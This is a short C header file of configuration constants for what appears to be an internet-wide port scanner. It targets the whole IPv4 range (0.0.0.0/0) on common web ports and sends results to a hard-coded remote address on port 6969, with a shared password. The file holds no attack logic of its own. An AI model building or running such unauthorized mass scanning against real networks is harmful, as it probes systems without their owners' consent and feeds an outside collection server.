#ifndef CONFIG_H
# define CONFIG_H

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define PORT_SCANNER_ADDR inet_addr("87.106.196.195")
#define PORT_SCANNER_PORT htons(6969)

#define PASSWORD "groume"
#define SEEK_IP "0.0.0.0/0"
#define SEEK_PORT "80,88,8080,8888,8880,8000,8088"
#define NUMBER 150


#endif
